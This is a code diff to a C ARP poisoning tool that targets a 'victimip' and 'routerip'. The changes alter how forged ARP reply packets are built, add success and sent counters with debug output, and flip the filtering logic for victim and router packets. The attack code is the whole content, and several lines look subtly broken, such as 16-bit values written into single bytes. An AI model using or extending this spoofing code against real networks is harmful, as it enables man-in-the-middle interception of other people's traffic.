@@ -26,6 +26,9 @@ extern struct in_addr routerip;
 extern struct in_addr victimip;
 extern u_char mac[ETH_ADDR_SIZE];
 
+int arp_sent = 0;
+int arp_success = 0;
+
     void
 handle_arp (const struct pcap_pkthdr *h,const u_char * packet )
 {
@@ -74,9 +77,15 @@ arp_poison (const struct pkt_arp * packet )
     offset += 2;
     //ARP structure
     //cpy in one pass htype,ptype,hard_len,proto_len
-    memcpy(bytes+offset,packet,6);
-    offset += 6;
-    
+    //memcpy(bytes+offset,packet,6);
+    //offset += 6;
+    bytes[offset] = htons(packet->htype);
+    offset += 2;
+    bytes[offset] = htons(packet->ptype);
+    offset += 2;
+    bytes[offset++] = packet->hard_addr_len;
+    bytes[offset++] = packet->proto_addr_len;
+
     // code reply
     bytes[offset]  = htons(ARPOP_REPLY);
     offset += 2;
@@ -93,9 +102,16 @@ arp_poison (const struct pkt_arp * packet )
     // DEST ip addr, i.e. victim
     memcpy(bytes+offset,packet->proto_addr_send,IP_ADDR_SIZE);
     offset += ETH_ADDR_SIZE;
-    
-    send_packet(bytes,sizeof(const struct pkt_arp));
-    printf("ARP Poison Packet have been sent ! ");
+    for(offset=0;offset < 60;offset++) printf("x"); 
+    print_pkt_eth((const struct pkt_eth *) bytes);
+    print_pkt_arp((const struct pkt_arp * ) bytes+ETH_SIZE);  
+    if ( 0 == send_packet(bytes,ARP_PACKET_SIZE)) {
+        arp_success++;
+    }
+    arp_sent++;
+    for(offset=0;offset<60;offset++) printf("x");
+        
+    printf("Success : %d\tSent : %d\n",arp_success,arp_sent);
     return ;
 }		/* -----  end of function arp_poison  ----- */
 
@@ -105,6 +121,7 @@ return;
 }
 
 int is_from_victim(const struct pkt_arp * packet) {
+    return 0;
     const struct in_addr * addr = (const struct in_addr *) packet->proto_addr_send;
     if ( addr->s_addr != victimip.s_addr) return -1;
     return 0;
@@ -116,7 +133,6 @@ int is_from_victim(const struct pkt_arp * packet) {
  * for now =)
  * */
 int is_router_packet(const struct pkt_arp * packet) {
-	return 1;
     const struct in_addr * addr;
     addr = (const struct in_addr*)packet->proto_addr_dest;
     if (addr->s_addr  !=  routerip.s_addr)  {
@@ -130,7 +146,7 @@ int is_router_packet(const struct pkt_arp * packet) {
         return 0;
     }
 
-    return 1;
+    return -1;
 
 }
 
